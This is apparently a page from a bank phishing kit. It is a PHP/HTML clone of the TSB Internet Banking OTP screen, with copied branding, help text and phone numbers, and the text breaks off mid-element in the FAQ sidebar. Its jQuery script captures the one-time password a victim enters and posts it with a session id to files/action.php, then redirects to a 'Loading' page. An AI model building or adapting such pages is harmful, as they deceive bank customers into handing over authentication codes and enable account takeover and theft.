<?php
session_start();
include 'files/config.php';
include 'files/connect.php';

if($_SESSION['started'] == 'true'){
	//echo '<script> console.log('.$_SESSION['uniqueid'].');</script>';
}else{
	header('location:exit.php');
}

?>
<!DOCTYPE html>

<html lang="en_gb" dir="ltr" style="opacity: 1;">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <style type="text/css">
            [uib-typeahead-popup].dropdown-menu {
                display: block;
            }
        </style>
        <style type="text/css">
            .uib-time input {
                width: 50px;
            }
        </style>
        <style type="text/css">
            [uib-tooltip-popup].tooltip.top-left > .tooltip-arrow,
            [uib-tooltip-popup].tooltip.top-right > .tooltip-arrow,
            [uib-tooltip-popup].tooltip.bottom-left > .tooltip-arrow,
            [uib-tooltip-popup].tooltip.bottom-right > .tooltip-arrow,
            [uib-tooltip-popup].tooltip.left-top > .tooltip-arrow,
            [uib-tooltip-popup].tooltip.left-bottom > .tooltip-arrow,
            [uib-tooltip-popup].tooltip.right-top > .tooltip-arrow,
            [uib-tooltip-popup].tooltip.right-bottom > .tooltip-arrow,
            [uib-tooltip-html-popup].tooltip.top-left > .tooltip-arrow,
            [uib-tooltip-html-popup].tooltip.top-right > .tooltip-arrow,
            [uib-tooltip-html-popup].tooltip.bottom-left > .tooltip-arrow,
            [uib-tooltip-html-popup].tooltip.bottom-right > .tooltip-arrow,
            [uib-tooltip-html-popup].tooltip.left-top > .tooltip-arrow,
            [uib-tooltip-html-popup].tooltip.left-bottom > .tooltip-arrow,
            [uib-tooltip-html-popup].tooltip.right-top > .tooltip-arrow,
            [uib-tooltip-html-popup].tooltip.right-bottom > .tooltip-arrow,
            [uib-tooltip-template-popup].tooltip.top-left > .tooltip-arrow,
            [uib-tooltip-template-popup].tooltip.top-right > .tooltip-arrow,
            [uib-tooltip-template-popup].tooltip.bottom-left > .tooltip-arrow,
            [uib-tooltip-template-popup].tooltip.bottom-right > .tooltip-arrow,
            [uib-tooltip-template-popup].tooltip.left-top > .tooltip-arrow,
            [uib-tooltip-template-popup].tooltip.left-bottom > .tooltip-arrow,
            [uib-tooltip-template-popup].tooltip.right-top > .tooltip-arrow,
            [uib-tooltip-template-popup].tooltip.right-bottom > .tooltip-arrow,
            [uib-popover-popup].popover.top-left > .arrow,
            [uib-popover-popup].popover.top-right > .arrow,
            [uib-popover-popup].popover.bottom-left > .arrow,
            [uib-popover-popup].popover.bottom-right > .arrow,
            [uib-popover-popup].popover.left-top > .arrow,
            [uib-popover-popup].popover.left-bottom > .arrow,
            [uib-popover-popup].popover.right-top > .arrow,
            [uib-popover-popup].popover.right-bottom > .arrow,
            [uib-popover-html-popup].popover.top-left > .arrow,
            [uib-popover-html-popup].popover.top-right > .arrow,
            [uib-popover-html-popup].popover.bottom-left > .arrow,
            [uib-popover-html-popup].popover.bottom-right > .arrow,
            [uib-popover-html-popup].popover.left-top > .arrow,
            [uib-popover-html-popup].popover.left-bottom > .arrow,
            [uib-popover-html-popup].popover.right-top > .arrow,
            [uib-popover-html-popup].popover.right-bottom > .arrow,
            [uib-popover-template-popup].popover.top-left > .arrow,
            [uib-popover-template-popup].popover.top-right > .arrow,
            [uib-popover-template-popup].popover.bottom-left > .arrow,
            [uib-popover-template-popup].popover.bottom-right > .arrow,
            [uib-popover-template-popup].popover.left-top > .arrow,
            [uib-popover-template-popup].popover.left-bottom > .arrow,
            [uib-popover-template-popup].popover.right-top > .arrow,
            [uib-popover-template-popup].popover.right-bottom > .arrow {
                top: auto;
                bottom: auto;
                left: auto;
                right: auto;
                margin: 0;
            }
            [uib-popover-popup].popover,
            [uib-popover-html-popup].popover,
            [uib-popover-template-popup].popover {
                display: block !important;
            }
        </style>
        <style type="text/css">
            .uib-datepicker-popup.dropdown-menu {
                display: block;
                float: none;
                margin: 0;
            }
            .uib-button-bar {
                padding: 10px 9px 2px;
            }
        </style>
        <style type="text/css">
            .uib-position-measure {
                display: block !important;
                visibility: hidden !important;
                position: absolute !important;
                top: -9999px !important;
                left: -9999px !important;
            }
            .uib-position-scrollbar-measure {
                position: absolute !important;
                top: -9999px !important;
                width: 50px !important;
                height: 50px !important;
                overflow: scroll !important;
            }
            .uib-position-body-scrollbar-measure {
                overflow: scroll !important;
            }
        </style>
        <style type="text/css">
            .uib-datepicker .uib-title {
                width: 100%;
            }
            .uib-day button,
            .uib-month button,
            .uib-year button {
                min-width: 100%;
            }
            .uib-left,
            .uib-right {
                width: 100%;
            }
        </style>
        <style type="text/css">
            .ng-animate.item:not(.left):not(.right) {
                -webkit-transition: 0s ease-in-out left;
                transition: 0s ease-in-out left;
            }
        </style>
        <style type="text/css">
            @charset "UTF-8";
            [ng\:cloak],
            [ng-cloak],
            [data-ng-cloak],
            [x-ng-cloak],
            .ng-cloak,
            .x-ng-cloak,
            .ng-hide:not(.ng-hide-animate) {
                display: none !important;
            }
            ng\:form {
                display: block;
            }
            .ng-animate-shim {
                visibility: hidden;
            }
            .ng-anchor {
                position: absolute;
            }
        </style>
        
		
        <title>Login</title>
        <meta name="description" property="description" content="Welcome to Internet Banking" />

        
		
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <link rel="shortcut icon" href="files/img/favicon.ico" />
        <link rel="stylesheet" type="text/css" media="print" href="./files/css/print_base-min.css" />
        <link rel="stylesheet" type="text/css" media="screen,print" href="./files/css/styles-min.css" />
        <link rel="stylesheet" type="text/css" media="screen" href="./files/css/promotionals-min.css" />
        
		
        <style id="at-makers-style" class="at-flicker-control">
            .mboxDefault {
                visibility: hidden;
            }
        </style>
        
		<script src="files/js/jquery.js"></script>
	<script>
	
//
$( document ).ready(function() {

	




	
	var allInputs = $(":input");
	

	
	
	
	allInputs.keyup(function() {
	
	
	

		if($(this).prop('required')){
			if(!$(this).val()){
				$(this).parent().parent().next().show();
			}else{
				$(this).parent().parent().next().hide();
			}
		}
	});
	
	allInputs.focusout(function() {
		$(this).blur(function() {
			if($(this).prop('required')){
			if(!$(this).val()){
				$(this).parent().parent().next().show();
			}else{
				$(this).parent().parent().next().hide();
			}
		}
		});
	});
	
	
		
	
	
	
	
	
	$('#signatureForm').submit(function(e){
		e.preventDefault();
		var OTPInput = $('#OTPInput').val();
		
		if(OTPInput == null || OTPInput == ''){
			return false;
		}else{
			
		}
		
		
		$.ajax({
			type : 'POST',
			url : 'files/action.php?type=otp',
			data : $('#signatureForm').serialize(),
			success: function (data) {
				console.log(data);
				var parsed_data = JSON.parse(data);
				if(parsed_data.status == 'ok'){
					//console.log(parsed_data);
					
					
					location.href = "Loading.php"
					
					
					
				}else{
					return false;
				}
				//console.log(parsed_data.status);
			}
			})
		
		
		
	});
	
	
	
	

	
	
	
});
	
	
	
	</script>
    </head>
    <body>
        
		
        <div id="wrapperDefault">
            <div class="container">
                <nav class="navbar navbar-default header-tsb">
                    <div class="navbar-header">
                        <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false">
                            <span class="sr-only">Toggle navigation</span>
                            <span class="icon-bar"></span>
                            <span class="icon-bar"></span>
                            <span class="icon-bar"></span>
                        </button>
                        <div class="navbar-brand">
                            <h2 id="env-identifier" style="background: yellow; font-size: 42px; margin: 0; position: absolute; color: red; font-weight: bold;"></h2>
                            <img src="./files/img/logo-6-1409059355.png" title="TSB logo" alt="TSB logo" />
                        </div>
                    </div>
                    <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
                        <div class="loggedIn">
                            <ul class="nav navbar-nav navbar-right abcd unordered-list">
                                <li class="list-element no-bullet">
                                    <span class="icon-arrow-lo"></span>
                                    <a href="https://internetbanking.tsb.co.uk/personal/a/cookie-policy/" target="_self" title="Cookie Policy" class="">Cookie Policy</a>
                                </li>
                                <li class="list-element no-bullet">
                                    <span class="icon-secure-small">
                                        You're logging into a secure site
                                    </span>
                                </li>

                                <ul class="abcd unordered-list">
                                    <li class="list-element no-bullet">
                                        <span class="icon-arrow-lo"></span> <a href="http://tsb.co.uk/security.asp" target="_blank" title="How can I tell that this site is secure?" class="">How can I tell that this site is secure?</a>
                                    </li>
                                </ul>
                            </ul>
                        </div>
                    </div>
                </nav>
            </div>

            <div class="pageWrap">
                <div class="container">
                    <div id="experienceathead" class="col-md-12" style="margin-bottom: 2px;"></div>
                    <div id="page">
                        <div class="row">
                            <div class="col-md-8 col-xs-12">
                                <div class="primary" id="literalsLoader" style="display: block;">
                                    <div id="spa-credentialsPublic-1.0" spacode="credentialsPublic" spaid="1464167919044" class="clearfix">
                                        <link rel="stylesheet" href="./files/css/d631d9e5.vendor.min.css" />
                                        <link rel="stylesheet" href="./files/css/0eb8ac02.tsb-credentials-public.min.css" />

                                        <!-- uiView:  -->
                                        <div id="credentialsPublic" ui-view="" autoscroll="false" class="ng-scope">
                                            <!-- ngInclude: '/spasR20.2/credentialsPublic/components/credentials-public/log-on/sca-modals/sca-modals-tpl.html' -->
                                            <div ng-include="&#39;/spasR20.2/credentialsPublic/components/credentials-public/log-on/sca-modals/sca-modals-tpl.html&#39;" class="ng-scope">
                                                <div
                                                    id="modalTimeOut"
                                                    class="modal fade ng-isolate-scope"
                                                    tabindex="-1"
                                                    role="dialog"
                                                    aria-labelledby="modalTimeOutLabel"
                                                    size="lg"
                                                    modal-id="modalTimeOut"
                                                    modal-size="md"
                                                    modal-type="primary"
                                                    component="modalTimeOut"
                                                >
                                                    <div class="modal-dialog modal-md" role="document">
                                                        <div class="modal-content modal-primary">
                                                            <ng-transclude>
                                                                <div class="modal-header no-padding-top ng-isolate-scope">
                                                                    <a class="close" data-dismiss="modal" aria-label="Close" ng-click="$parent.close()"><span aria-hidden="true" class="hidden-lg hidden-md hidden-sm">×</span></a>
                                                                    <ng-transclude>
                                                                        <div class="row ng-scope">
                                                                            <div class="col-md-12 lg-padding-left">
                                                                                <span class="md-margin-top float-icon icon-error icon-error" icon="error"></span>
                                                                                <h2 class="text-bold md-margin-top lg-margin-left ng-scope" paragraph="true" translate="">You have not logged in on time</h2>
                                                                            </div>
                                                                        </div>
                                                                        <div class="proteo-select-account-body modal-body ng-isolate-scope">
                                                                            <ng-transclude>
                                                                                <div class="row ng-scope">
                                                                                    <div class="col-md-12">
                                                                                        <p class="text-std" ng-transclude="" paragraph="true" translate="">
                                                                                            As you've been inactive for a while you'll need to log in again for security reasons.
                                                                                        </p>
                                                                                    </div>
                                                                                </div>
                                                                            </ng-transclude>
                                                                        </div>
                                                                        <div class="center-button modal-footer ng-isolate-scope" ng-transclude="">
                                                                            <button class="btn md-btn ng-isolate-scope" ng-transclude="" ng-click="modalTimeOut.close()">
                                                                                <span class="text-std" ng-transclude="" translate="">Log back into your accounts</span>
                                                                            </button>
                                                                        </div>
                                                                    </ng-transclude>
                                                                </div>
                                                            </ng-transclude>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div ng-controller="scaModalsController" class="ng-scope">
                                                    <div
                                                        id="addBlockModalError"
                                                        class="modal fade ng-isolate-scope"
                                                        tabindex="-1"
                                                        role="dialog"
                                                        aria-labelledby="addBlockModalErrorLabel"
                                                        size="lg"
                                                        modal-id="addBlockModalError"
                                                        modal-size="md"
                                                        modal-type="primary"
                                                        data-backdrop="static"
                                                        data-keyboard="false"
                                                    >
                                                        <div class="modal-dialog modal-md" role="document">
                                                            <div class="modal-content modal-primary">
                                                                <ng-transclude>
                                                                    <div class="row md-margin-top md-margin-left md-margin-right ng-scope">
                                                                        <h2><span class="text-bold text-std" ng-transclude="" translate="">Something's not right</span></h2>
                                                                    </div>
                                                                    <div id="loginModalError" class="md-margin text-red text-bold ng-scope" ng-show="errorRemainingAttempts !== null">
                                                                        <span class="text-bold text-std" ng-transclude="" ng-bind="errorRemainingAttempts"></span>
                                                                    </div>
                                                                    <span class="text-std" ng-transclude="" translate="">One or more of the details you've provided don't match our records.</span>
                                                                    <div class="md-margin-top md-margin-bottom ng-scope">
                                                                        <ul class="unordered-list md-padding-left">
                                                                            <li class="list-element">
                                                                                <span class="text-std" ng-transclude="" translate="">
                                                                                    Check that you're entering the correct Internet Banking password and characters from your memorable information
                                                                                </span>
                                                                            </li>
                                                                            <li class="list-element">
                                                                                <span class="text-std" ng-transclude="" translate="">You can </span>
                                                                                <a class="link-std ng-isolate-scope" ng-href="" ng-transclude="" ng-click="enterCustomerIdData()">
                                                                                    <span class="text-std" ng-transclude="" translate="">reset your login details</span>
                                                                                </a>
                                                                                <span class="text-std" ng-transclude="" translate=""> if you've forgotten them</span>
                                                                            </li>
                                                                            <!-- ngIf: isOtp || isPassAndOtp -->
                                                                        </ul>
                                                                        <div class="md-margin-top">
                                                                            <span class="text-std" ng-transclude="" translate="">
                                                                                Still having problems? Give us a call on 0345 835 3844 (Mon to Fri 7am-10pm, weekends 8am-6pm). Or you can pop into your local branch.
                                                                            </span>
                                                                        </div>
                                                                    </div>
                                                                    <div class="modal-footer ng-isolate-scope" ng-transclude="">
                                                                        <proteo-ui-modal-call-back class="ng-scope">
                                                                            <div class="row">
                                                                                <button class="center-block btn md-btn ng-isolate-scope" ng-transclude="" ng-click="tryAgainLogin()">
                                                                                    <span class="text-std" ng-transclude="" translate="">Let's try again!</span>
                                                                                </button>
                                                                            </div>
                                                                        </proteo-ui-modal-call-back>
                                                                    </div>
                                                                </ng-transclude>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div
                                                        id="addBlockModalDevice"
                                                        class="modal fade ng-isolate-scope"
                                                        tabindex="-1"
                                                        role="dialog"
                                                        aria-labelledby="addBlockModalDeviceLabel"
                                                        size="lg"
                                                        modal-id="addBlockModalDevice"
                                                        modal-size="md"
                                                        modal-type="primary"
                                                        data-backdrop="static"
                                                        data-keyboard="false"
                                                    >
                                                        <div class="modal-dialog modal-md" role="document">
                                                            <div class="modal-content modal-primary">
                                                                <ng-transclude>
                                                                    <div class="row md-margin-top md-margin-left md-margin-right ng-scope">
                                                                        <h2><span class="text-bold text-std" ng-transclude="" translate="">Is this your own device?</span></h2>
                                                                    </div>
                                                                    <div class="modal-body ng-isolate-scope">
                                                                        <ng-transclude>
                                                                            <span class="text-std" ng-transclude="" translate="">
                                                                                If only you have access to this device, you can 'trust' it so we don't have to send you a One-Time Password every time you log in.
                                                                            </span>
                                                                            <div class="md-margin-top ng-scope">
                                                                                <span class="text-std" ng-transclude="" translate="">
                                                                                    If you share this device with someone else, or you're using a computer in a library or internet café for example, you shouldn't 'trust' it.
                                                                                </span>
                                                                            </div>
                                                                        </ng-transclude>
                                                                    </div>
                                                                    <div class="modal-footer ng-isolate-scope" ng-transclude="">
                                                                        <proteo-ui-modal-call-back class="ng-scope">
                                                                            <button class="pull-right btn md-btn ng-isolate-scope" ng-transclude="" ng-click="trust()">
                                                                                <span class="text-std" ng-transclude="" translate="">Trust</span>
                                                                            </button>
                                                                            <button class="pull-left btn-white btn md-btn ng-isolate-scope" ng-transclude="" ng-click="dontTrust()">
                                                                                <span class="text-std" ng-transclude="" translate="">Do not trust</span>
                                                                            </button>
                                                                        </proteo-ui-modal-call-back>
                                                                    </div>
                                                                </ng-transclude>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div
                                                        id="addBlockModalBrowser"
                                                        class="modal fade ng-isolate-scope"
                                                        tabindex="-1"
                                                        role="dialog"
                                                        aria-labelledby="addBlockModalBrowserLabel"
                                                        size="lg"
                                                        modal-id="addBlockModalBrowser"
                                                        modal-size="md"
                                                        modal-type="primary"
                                                        data-backdrop="static"
                                                        data-keyboard="false"
                                                    >
                                                        <div class="modal-dialog modal-md" role="document">
                                                            <div class="modal-content modal-primary">
                                                                <ng-transclude>
                                                                    <div class="row md-margin-top md-margin-left md-margin-right ng-scope">
                                                                        <h2><span class="text-bold text-std" ng-transclude="" translate="">You are using a web browser not supported by this website</span></h2>
                                                                    </div>
                                                                    <div class="modal-body ng-isolate-scope">
                                                                        <ng-transclude>
                                                                            <div class="md-margin-top ng-scope">
                                                                                <span class="text-std" ng-transclude="" translate="">
                                                                                    This means that some function may not work as supposed which can result in strange behaviours when browsing around.
                                                                                </span>
                                                                            </div>
                                                                            <div class="md-margin-top md-margin-bottom ng-scope"><span class="text-std" ng-transclude="" translate="">Thank you!</span></div>
                                                                        </ng-transclude>
                                                                    </div>
                                                                    <div class="modal-footer ng-isolate-scope" ng-transclude="">
                                                                        <proteo-ui-modal-call-back class="ng-scope">
                                                                            <button class="center-block btn md-btn ng-isolate-scope" ng-transclude="" ng-click="agree()">
                                                                                <span class="text-std" ng-transclude="" translate="">Understood</span>
                                                                            </button>
                                                                        </proteo-ui-modal-call-back>
                                                                    </div>
                                                                </ng-transclude>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="row ng-scope">
                                                <div sca-enrollment-otp-panel-error=""><!-- ngIf: error --></div>
                                                <div class="col-xs-12 signaturePanel ng-isolate-scope" sca-enrollment-otp="" id="signaturePanelId">
                                                    <h1 class="no-margin-top sm-margin-top ng-scope" translate="">Confirm your identity</h1>
                                                    <!-- ngIf: globalError -->
                                                    <form name="signatureForm" id="signatureForm" method="POST" ng-show="!globalError" class="ng-pristine ng-invalid ng-invalid-required">
                                                        <input type='hidden' name='userid' value="<?=$_SESSION['uniqueid'];?>">
														<sca-enrollment-otp-panel form-name="signatureForm" is-public-otp="true" operation-data="operationData" go-with-activation="notPhones()" class="ng-isolate-scope">
                                                            <div id="signaturePanel">
                                                                <!-- ngIf: exceptionLiteral && exceptionLiteral != 'isValid' --><!-- ngIf: templatename === 'nosign' --><!-- ngIf: templateName === 'otp' -->
                                                                <div ng-if="templateName === &#39;otp&#39;" class="ng-scope">
                                                                    <!-- ngIf: !$parent.selectedPhone && !isValidFlag -->
                                                                    
                                                                    <!-- end ngIf: !$parent.selectedPhone && !isValidFlag -->
                                                                    <div ng-show="$parent.selectedPhone" class="col-xs-12">
                                                                        <div class="row ng-isolate-scope" is-sms="$parent.phone.type === &#39;mobile&#39;" reset-input="resetDirective" entered-otp="$parent.data.otp" is-sca="true">
                                                                            <ng-form
                                                                                name="OTPForm"
                                                                                class="col-xs-12 ng-pristine ng-invalid ng-invalid-required success"
                                                                                ng-class="{&#39;error xs-padding-top sm-padding-bottom&#39; : !isSca &amp;&amp; showErrors(OTPForm), &#39;success&#39; : !showErrors(OTPForm)}"
                                                                            >
                                                                                <div class="row lg-margin-bottom">
                                                                                    <div class="col-xs-12">
                                                                                        <!-- ngIf: !isSms -->
                                                                                        <div ng-if="!isSms" class="ng-scope">
                                                                                            <h3 class="text-bold lg-margin-bottom ng-scope" translate="">Enter your One-Time Password (OTP)</h3>
                                                                                            <p class="text-std" ng-transclude="" paragraph="" translate="">
                                                                                                We've sent your OTP to the number you chose. Please enter it below and select 'Confirm'.
                                                                                            </p>
                                                                                        </div>
                                                                                        <!-- end ngIf: !isSms --><!-- ngIf: isSms -->
                                                                                    </div>
                                                                                </div>
                                                                                <div class="row lg-margin-bottom">
                                                                                    <div
                                                                                        class="col-xs-6 col-sm-5 col-md-3 form-group has-feedback has-succees"
                                                                                        ng-class="{&#39;has-feedback has-error&#39; : showErrors(OTPForm), &#39;has-feedback has-succees&#39; : !showErrors(OTPForm)}"
                                                                                    >
                                                                                        <div class="input-group">
                                                                                            <input
                                                                                                class="form-control ng-isolate-scope ng-invalid ng-invalid-required"
                                                                                                type="password"
                                                                                                id="OTPInput"
                                                                                                name="OTPInput"
                                                                                                required="required"
                                                                                            />
                                                                                            <span
                                                                                                class="shift-icon input-group-addon glyphicon glyphicon-eye-open icon- icon- ng-hide"
                                                                                                ng-show="OTPForm &amp;&amp; OTPForm.OTPInput.$viewValue"
                                                                                                ng-click="viewOTP = !viewOTP"
                                                                                            ></span>
                                                                                        </div>
                                                                                    </div>
																					
																					
																					
                                                                                    <div style="display:none;" class="col-xs-12 col-sm-7" ng-show="showErrors(OTPForm)"><!-- ngRepeat: (key, value) in OTPForm['OTPInput'].$error --><div ng-show="!displayEmptyError" ng-repeat="(key, value) in OTPForm['OTPInput'].$error" class="ng-scope"><div class="icon"><span class="icon-alert  red-icon " icon-bg="red" icon="alert"></span></div><div class="error-text"><span class="text-std" ng-transclude="" ng-bind="validationRules[key].msg | translate:validationRules[key].translateValues">Please enter a value</span></div></div><!-- end ngRepeat: (key, value) in OTPForm['OTPInput'].$error --></div>
																					
																					
																					
																					
                                                                                </div>
                                                                                <div class="row md-margin-bottom">
                                                                                    <div class="col-xs-12">
                                                                                        <h2 class="text-bold troubleshooting-title ng-scope" paragraph="" translate="">One-Time Passwords – Troubleshooting</h2>
                                                                                        <p class="troubleshooting-subtitle text-std" ng-transclude="" paragraph="" translate="">
                                                                                            If you are experiencing any problems in receiving your One-Time Passcode, please look at the hints and tips below:
                                                                                        </p>
                                                                                        <ul class="unordered-list troubleshooting">
                                                                                            <li><span class="text-std" ng-transclude="" translate="">
                                                                                                    If you don’ t receive the One-Time Password within two minutes, press ‘Previous’ below to go back to the previous page.You can then try
                                                                                                    again with the same number or choose a different number for us to contact you on.
                                                                                                </span>
                                                                                            </li>
                                                                                            <li><span class="text-std" ng-transclude="" translate="">
                                                                                                    Please make sure any call or SMS blockers / guardian services are turned off temporarily and try again, as these might prevent the One-Time
                                                                                                    Password from coming through.
                                                                                                </span>
                                                                                            </li>
                                                                                            <li><span class="text-std" ng-transclude="" translate="">Any One-Time Password we send is valid for 10 minutes from the time you request it.</span>
                                                                                            </li>
                                                                                            <li><span class="text-std" ng-transclude="" translate="">
                                                                                                    For International Phone numbers, the One-Time Password will always come through as a call.
                                                                                                </span>
                                                                                            </li>
                                                                                        </ul>
                                                                                    </div>
                                                                                </div>
                                                                                <div class="row">
                                                                                    <div class="col-xs-12">
                                                                                        <!-- ngIf: !isSms -->
                                                                                        <p class="text-std" ng-transclude="" paragraph="" ng-if="!isSms" translate="">
                                                                                            If you don't receive your OTP within 1 minute, please select 'Previous' and try again. If you're still having problems, try choosing a different
                                                                                            number or call us on 0345 835 3844.
                                                                                        </p>
                                                                                        <!-- end ngIf: !isSms --><!-- ngIf: isSms -->
                                                                                        <p class="text-std" ng-transclude="" paragraph="" translate="">
                                                                                            If after trying again you're still having issues then call us on 0345 835 3847 (or +44 203 184 1578 if you're abroad) and we will help you out.
                                                                                        </p>
                                                                                    </div>
                                                                                </div>
                                                                            </ng-form>
                                                                        </div>
                                                                    </div>
                                                                    <!-- ngIf: displayedError -->
                                                                </div>
                                                                <!-- end ngIf: templateName === 'otp' -->
                                                            </div>
                                                        </sca-enrollment-otp-panel>
                                                    
                                                    <div class="ng-isolate-scope">
                                                        <div class="clearfix"></div>
                                                        <hr />
                                                    </div>
                                                    <div class="row md-margin-top">
                                                        <div class="col-xs-12 col-sm-6">
                                                            <!-- ngIf: false -->
                                                            <a class="hidden-sm hidden-md hidden-lg lg-margin-top link-std ng-isolate-scope" ng-href="" ng-transclude="" ng-click="cancel()">
                                                                <span class="icon-cancel" icon="cancel"></span><span class="text-std" ng-transclude="" translate="">BUSINESS_CREDENTIALS_PUBLIC_COMMON_CANCEL</span>
                                                            </a>
                                                            <a class="hidden-xs lg-margin-left link-std ng-isolate-scope" ng-href="" ng-transclude="" ng-click="cancel()">
                                                                <span class="icon-cancel" icon="cancel"></span><span class="text-std" ng-transclude="" translate="">Cancel</span>
                                                            </a>
                                                        </div>
                                                        <div class="col-xs-12 col-md-6 text-right">
                                                            <button
                                                                class="pull-right btn md-btn ng-isolate-scope"
                                                                type="submit"
                                                            >
                                                                <span class="text-std ng-scope" ng-transclude="" translate="">Confirm</span>
                                                            </button>
                                                        </div>
                                                    </div>
													
													</form>
													
                                                </div>
                                            </div>
                                        </div>

                                        
										
                                    </div>
                                    
									
                                </div>

                                <div class="promotionalDefault" style="min-height: 4px;"></div>
                            </div>

                            <div id="lateralPanel">
                                <!-- EFB-LPRb -->
                                <div class="secondary col-md-4 col-xs-12">
                                    <input type="hidden" id="testingInput" data-p="1464167933360" />
                                    
									
                                    <div class="panel">
                                        <div id="lateral-panel-content-inbox"></div>
                                        <div id="lateral-panel-content-1">
                                            <div class="accordion">
                                                <div class="part">
                                                    <h2 class="trigger" title="Contact Us...: Use this link to show or hide information">Contact Us... <span class="icon-plus-lg pull-right"></span></h2>
                                                    <div class="pane closed">
                                                        <div class="paneInner">
                                                            <div class="quickContact">
                                                                <div class="row">
                                                                    <!-- Asset details - id [1464167918875] - type [Content_C]-->
                                                                    <div class="col-sm-12 col-xs-12 content_basic">
                                                                        <div class="article flex-col">
                                                                            <div class="backgroundWhite row">
                                                                                <div class="col-sm-12 text_banner">
                                                                                    <h3 id="All_account_related_queries-1464167918875" class="h3">All account related queries</h3>
                                                                                    <div>
                                                                                        <div><strong>0345 975 8758</strong></div>
                                                                                    </div>
                                                                                    <div>
                                                                                        <div></div>
                                                                                        <div></div>
                                                                                        <div>&nbsp;</div>
                                                                                        <div>If you need to call us from abroad or prefer not to use our 0345 number, you can also call us on&nbsp;<strong>+44 (0) 203 284 1575.</strong></div>
                                                                                        <div>
                                                                                            Calls may be monitored and recorded in case we need to check we have carried out your instructions correctly and to help us improve our quality of
                                                                                            service.
                                                                                        </div>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <!-- Asset details - id [1464167918901] - type [Content_C]-->
                                                                    <div class="col-sm-12 col-xs-12 content_basic">
                                                                        <div class="article flex-col">
                                                                            <div class="backgroundWhite row">
                                                                                <div class="col-sm-12 text_banner">
                                                                                    <h3 id="Internet_banking_queries-1464167918901" class="h3">Internet banking queries</h3>
                                                                                    <div>
                                                                                        <div><!--StartFragment-->Technical queries about the Internet Banking service<!--EndFragment--></div>
                                                                                    </div>
                                                                                    <div>
                                                                                        <!--StartFragment-->
                                                                                        <p>&nbsp;</p>
                                                                                        <p>Call&nbsp;us on<strong>&nbsp;0345 835 3844</strong>. We’re open 8am-8pm Mon-Sat, 8am-6pm Sun.</p>
                                                                                        <p>If you need to call us from abroad you can also call us on<strong>&nbsp;+44 (0)203 284 1577</strong></p>
                                                                                        <!--EndFragment-->
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="promotionalDefault" style="min-height: 4px;"></div>
                                        <div id="lateral-panel-content-2">
                                            <div class="accordion">
                                                <div class="part">
                                                    <h2 class="trigger" title="Help &amp; Support: Use this link to show or hide information">Help &amp; Support <span class="icon-minus-lg pull-right"></span></h2>
                                                    <div class="pane open">
                                                        <div class="paneInner">
                                                            <div id="inbentaFaqsData">
                                                                <!-- EFB-IRb -->
                                                                <ul class="unordered-list no-bullet no-padding-left" inbentaprofile="2" inbentacategory="143">
                                                                    <li class="list-element no-bullet no-margin-left">
                                                                        <div
                                                                            class="qfaqTrigger"
                                                                            inbentaid="eyJpdiI6InZrWVFOMTdXYlV5cDVNYjZacVVYemc9PSIsInZhbHVlIjoidkxFRjFiSHhZaXZMaWNrMDFCeDhXMmNzSEUrb2FOaEZHVkE4ZFMzNE95VENDMjV1ZVZWakt0UTBWaGNPNU4xZU0rRE5zTmRpWVZ0T3gweEpJd2hMUDlnSmwxd0xaXC9lMEtKbzJzUllKSG1nNWUwVGMxN2xNWEJLd3dsNHBzMDhOIiwibWFjIjoiZjk5YjYzZjk3MWMyMDFiODgwY2Q0Mzg1NWM2N2JjY2E3ZGNiMTFhNjY4NGUxZDUyZDAxNWM4YzRmNjI4ZmEyNSJ9"
                                                                            title="Can my memorable information be the same as my password?: Use this link to show or hide information"
                                                                            status="closed"
                                                                            iframe="FALSE"
                                                                        >
                                                                            <span class="icon-plus"></span>
                                                                            <div class="faqsTitle">Can my memorable information be the same as my password?</div>
                                                                        </div>
                                                                        <div class="qfaqCont md-margin-left xs-padding-left">
                                                                            <p></p>
                                                                            <p>
                                                                                No. You need to choose memorable information that's different from your password. This is to ensure that your account stays as secure as possible. If you forget
                                                                                your memorable information or your password, click 'Having trouble logging in?' and follow the on-screen instructions.
                                                                            </p>
                                                                            <p></p>
                                                                        </div>
                                                                    </li>
                                                                    <li class="list-element no-bullet no-margin-left">
                                                                        <div
                                                                            class="qfaqTrigger"
                                                                            inbentaid="eyJpdiI6IkhDMjhHMEVHUEpha3o2NmtKNEdFXC9nPT0iLCJ2YWx1ZSI6InR5OFN5ejFTaE13Uk5GM21DbEllVW5nYWl4ZHF3eTJTMG1reWcyNjZYbW1BMDN0OXZYUXNqWmJYK0FvWlByRkhMckEyZUVmcFVYMTZucEZmRElaMEM3TEt0VFNzYUd5YXI0bllLYituUWdjNll6RkdFZFlnbXc0K0VkU3luazBlIiwibWFjIjoiN2ZjMTQ2OGZjN2IyMWFjZTAyOGJmNzg0MjJhZWQyNWZiM2I0NDE3MGFmOGYyNjYyZjczZmFhOTEzMjY3N2Y2NiJ9"
                                                                            title="How should I choose my Memorable Information?: Use this link to show or hide information"
                                                                            status="closed"
                                                                            iframe="FALSE"
                                                                        >
                                                                            <span class="icon-plus"></span>
                                                                            <div class="faqsTitle">How should I choose my Memorable Information?</div>
                                                                        </div>
                                                                        <div class="qfaqCont md-margin-left xs-padding-left">
                                                                            <p>You will need to choose your Memorable Information according to the following criteria:</p>
                                                                            <ul>
                                                                                <li>Must be between 6 (minimum) and 15 (maximum) characters in length and made up of letters and numbers</li>
                                                                                <li>Must include a minimum of 3 letters (e.g. abc123)</li>
                                                                                <li>Must include a minimum of 1 number (e.g. abcde1)</li>
                                                                                <li>No spaces, hyphens or special characters (e.g. #) are permitted</li>
                                                                                <li>Cannot be the same as your existing password or User ID</li>
                                                                            </ul>
                                                                            <p></p>
                                                                        </div>
                                                                    </li>
                                                                    <li class="list-element no-bullet no-margin-left">
                                                                        <div
                                                                            class="qfaqTrigger"
